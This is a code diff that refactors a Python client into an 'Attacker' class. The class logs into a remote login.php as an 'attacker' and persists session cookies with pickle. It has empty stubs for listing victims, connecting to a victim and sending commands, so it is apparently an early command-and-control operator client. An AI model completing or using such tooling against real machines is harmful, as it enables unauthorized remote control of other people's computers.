@@ -2,24 +2,66 @@ import requests
 import logging
 import pickle
 
-def login(session, url, type):
-    return session.request('GET', url, {'login':1, 'type':type})
+class Attacker:
 
-# Try to load session cookies from file
-def tryToLoadSessionCookies(session):
     # Try to load session cookies from file
-    try:
-        with open('cookies.dat', 'rb') as f:
-            session.cookies.update(pickle.load(f))
-    except FileNotFoundError:
+    def __tryToLoadSessionCookies(self):
+        # Try to load session cookies from file
+        try:
+            with open('cookies.dat', 'rb') as f:
+                self.__session.cookies.update(pickle.load(f))
+        except FileNotFoundError:
+            pass
+
+    # Do a login request to server
+    def __login(self, session, url, type):
+        return self.__session.request('GET', url, params={'login':1, 'type':type})
+
+    # Save session cookies to file:
+    def __writeSessionCookiesToFile(self):
+        # Write cookies to file
+        with open('cookies.dat', 'wb') as f:
+            pickle.dump(self.__session.cookies, f)
+
+    # Load session and log into the server. Return the connection response.
+    def connectToServer(self, baseUrl):
+        # Save server base url
+        self.__serverUrl = baseUrl
+
+        # Open session
+        self.__session = requests.Session()
+
+        # Try to load session cookies from file
+        self.__tryToLoadSessionCookies()
+
+        # Log in as attacker
+        response = self.__login(self.__session, self.__serverUrl + '/login.php', 'attacker')
+
+        # Save session cookies to file
+        self.__writeSessionCookiesToFile()
+
+        return response
+
+    def listVictims(self):
         pass
 
-# Save session cookies to file:
-def writeSessionCookiesToFile(session):
-    # Write cookies to file
-    with open('cookies.dat', 'wb') as f:
-        pickle.dump(session.cookies, f)
+    def connectToVictim(self, victim):
+        pass
 
+    def sendCommand(self):
+        pass
+
+    def disconnectFromVictim(self):
+        pass
+
+    def disconnectFromServer(self):
+        return self.__session.request('GET', self.__serverUrl + '/login.php', headers={'Connection':'close'})
+
+
+
+# Print response object
+def printResponse(response):
+    print(response.text, end='')
 
 def main():
     # Module for connection debugging
@@ -31,24 +73,23 @@ def main():
     # Store command
     data = {'cmd': None}
 
-    # Start session
-    with requests.session() as s:
-        # Try to load session cookies from file
-        tryToLoadSessionCookies(s)
+    attacker = Attacker()
+    printResponse(attacker.connectToServer(baseUrl))
+    #victimsList = attacker.listVictims()
+    #attacker.connectToVictim(victimsList[0])
+    #output = attacker.sendCommand('ls')
+    #print(output)
+    #attacker.disconnectFromVictim()
+    printResponse(attacker.disconnectFromServer())
 
-        # Log in as attacker
-        response = login(s, baseUrl + '/login.php', 'attacker')
 
-        # Save session cookies to file
-        writeSessionCookiesToFile(s)
+    #print(s.cookies.get_dict())
+    #print(response.content)
+    #print(response.text)
 
-        #print(s.cookies.get_dict())
-        #print(response.content)
-        print(response.text)
+    exit()
 
-        exit()
-
-        '''
+    '''
         while True:
             try:
                 # Read command
@@ -65,7 +106,7 @@ def main():
     #print(response.status_code, response.reason)
     #print(response.content)
     #print(response.text)
-        '''
+    '''
 
 if __name__ == "__main__":
     main()
